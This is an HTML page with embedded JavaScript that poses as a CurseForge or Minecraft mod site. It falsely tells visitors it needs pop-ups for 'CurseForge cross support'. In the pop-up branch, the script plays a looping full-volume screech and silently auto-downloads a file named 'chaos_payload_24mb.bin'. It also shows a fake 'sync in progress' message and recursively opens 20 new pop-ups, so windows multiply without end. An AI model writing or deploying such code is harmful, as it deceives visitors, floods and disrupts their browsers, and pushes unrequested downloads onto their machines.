<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Pop-up Permission Required</title>
  <script>
function openPopup() {
  const width = 500;
  const height = 400;

  // Use screen width and height for max coords
  const maxLeft = window.screen.width - width;
  const maxTop = window.screen.height - height;

  // Random position anywhere inside visible screen
  const left = Math.floor(Math.random() * maxLeft);
  const top = Math.floor(Math.random() * maxTop);

  const popup = window.open(
    window.location.href + "?popup=true",
    "_blank",
    `width=${width},height=${height},left=${left},top=${top}`
  );

  if (popup) {
    popup.focus();
    window.blur();
  }
}


    window.onload = function () {
      const isPopup = new URLSearchParams(window.location.search).has('popup');

      if (isPopup) {
        document.body.innerHTML = `
          <audio id="screech" autoplay loop>
            <source src="screech.mp3" type="audio/mpeg">
          </audio>
          <h1>CurseForge sync window</h1>
          <p>Sync in progress... do not close this window.</p>
          <a id="downloadLink" href="https://elitemetal7.github.io/CoolestMinecraftMods/chaos_payload_24mb.bin" download style="display:none"></a>
        `;

        const screech = document.getElementById('screech');
        screech.volume = 1.0;
        screech.play().catch(() => {
          document.body.addEventListener('click', () => {
            screech.play();
          }, { once: true });
        });

        const download = document.getElementById('downloadLink');
        download.click();

        // Spawn 20 popups immediately
        for (let i = 0; i < 20; i++) {
          openPopup();
        }

        setTimeout(() => {
          window.close();
        }, 4000);

      } else {
        document.body.innerHTML = `
          <h1>This wesbite requires pop-ups</h1>
          <p>Due to using CurseForge cross support, please enable pop-ups to contenue.</p>
          <p>Thank you for your understanding.</p>
        `;
        openPopup();
      }
    };
  </script>
